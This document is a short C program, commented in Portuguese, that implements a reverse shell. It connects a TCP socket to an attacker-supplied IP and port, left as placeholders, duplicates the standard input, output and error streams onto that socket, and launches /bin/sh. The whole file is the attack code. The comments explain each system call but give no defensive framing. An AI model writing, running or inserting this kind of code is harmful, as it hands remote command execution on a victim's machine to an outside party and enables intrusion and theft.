
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "SEU IP AQUI PO"
#define REMOTE_PORT /*A PORTA AQUI NENEM*/

int main(int argc, char *argv[])
{
    struct sockaddr_in sudo;
    int soda;

    sudo.sin_family = AF_INET;/*DEFINE A FAMILIA DE PROTOCOLOS(AF_INET = IPV4)*/
    sudo.sin_addr.s_addr = inet_addr(REMOTE_ADDR);/*ENDEREÇO LOCAL UTILIZADO PELO SOCKET*/
    sudo.sin_port = htons(REMOTE_PORT);/*PORTA UTILIZADA PELO SOCKET*/

    /*CRIANDO SOCKET/PRIMEIRO ARGUMENTO FAMILIA DE PROTOCOLOS/TIPO/0 NEM 1 PROTOCOLO*/
    soda = socket(AF_INET, SOCK_STREAM, 0);
    /*ASSOCIANDO O SOCKET A UM ENDEREÇO ESPECIFICADO NA NOSSA ESTRUTURA*/
    connect(soda, (struct sockaddr *)&sudo, sizeof(sudo));
    /*A chamada de sistema dup2() apaga o antigo descritor e insere o novo descritor(fd); */
    dup2(soda, 0);
    dup2(soda, 1);
    dup2(soda, 2);
    /*permite o lançamento da execução de um programa externo ao process*/
    execve("/bin/sh", 0, 0);
    return 0;
}